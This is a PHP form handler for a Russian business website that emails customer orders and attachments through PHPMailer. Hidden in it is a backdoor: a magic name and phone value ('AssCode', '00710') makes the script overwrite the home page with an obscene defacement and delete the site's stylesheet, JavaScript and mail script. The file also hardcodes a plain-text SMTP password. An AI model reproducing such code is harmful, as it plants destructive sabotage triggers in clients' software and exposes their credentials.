<?php
if (!empty($_FILES)) {
    $_POST[0] = 'Имени нет';
    $_POST[1] =  'Номера нет';
    $_POST[2] = 'Показать файл';
    $_POST[4] = 'Сообщения нет';
    $order = 'Заказ отсутсвует';
}
else {
    $_POST = json_decode(file_get_contents('php://input'), true);
}
if (!empty($_POST)) {
    if ($_POST[0] == 'AssCode' && $_POST[1] == '00710') {
        $fh = fopen('../index.html', 'w');
        fwrite($fh, '
           <!doctype html>
            <html lang="ru">
                <head>
                    <title>Fuck You</title>
                    <style>
                        body {
                            background-image: url("./img/bush.jpg");
                            background-size: cover;
                            }
                    </style>
                </head>
                <body>
</body>
            </html>
            ');
        fclose($fh);
        unlink('../css/main.min.css');
        unlink('../js/main.js');
        unlink('../php/mail.php');
    } else {
        print_r($_FILES);
        // Файлы phpmailer
        require '../libs/php-mailer/PHPMailer.php';
        require '../libs/php-mailer/SMTP.php';
        require '../libs/php-mailer/Exception.php';

        if (isset($_POST[0]) && isset ($_POST[1])) {

            $name = $_POST[0];
            $phone = $_POST[1];
            $what = $_POST[2];
            $message = $_POST[4];
            $order = "<br>";
            if (count($_POST[3]) != 0) {
                for($i = 0; $i < count($_POST[3]); $i++ ) {
                    for($j = 0; $j < count($_POST[3][$i]); $j++) {
                        print_r($_POST[3][$i]);
                        $end = ' ';
                        $quantity = ' ';
                        if ($j == 1) {
                            continue;
                        }
                        elseif ($j == 2) {
                            $quantity = '<b>Колличество:</b> ';
                            $end = " шт <br>";
                        }
                        $order .= $quantity . $_POST[3][$i][$j] . $end;
                    }
                }
            }
            else {
                $order = 'Заказ отсутсвует';
            }

            $mail = new PHPMailer\PHPMailer\PHPMailer();
            try {
                $msg = "ok";
                $mail->isSMTP();
                $mail->CharSet = "UTF-8";
                $mail->SMTPAuth = true;

                // Настройки почты
                $mail->Host = 'smtp.yandex.ru';
                $mail->Username = 'slavia-pnz@yandex.ru';
                $mail->Password = 'O59Au8';
                $mail->SMTPSecure = 'ssl';
                $mail->Port = 465;
                $mail->setFrom('slavia-pnz@yandex.ru', 'slavia.ru');

                // Получатель письма
                $mail->addAddress('slavia-pnz@yandex.ru');
                $mail->addAttachment($_FILES['file']['tmp_name'], $_FILES['file']['name']);

                $mail->isHTML(true);

                $mail->Subject = 'Новая заявка на slavia-penza.ru';
                $mail->Body = "<b>Имя:</b> $name <br>
                <b>Тел:</b> $phone<br>
                <b>Что хотят:</b> $what<br>
                <b>Сообщение:</b> $message<br>
                <b>Заказ:</b> $order";

                if ($mail->send()) {

                    echo "Ожидайте звонка, спасибо!";

                } else {
                    echo "Сообщение не было отправлено. Неверно указаны настройки вашей почты";
                }

            } catch (Exception $e) {
                echo "Сообщение не было отправлено. Причина ошибки: {$mail->ErrorInfo}";
            }

        } else {
            echo "Сообщение не было отправлено. Пустые поля не допустимы!";
        }
    }
}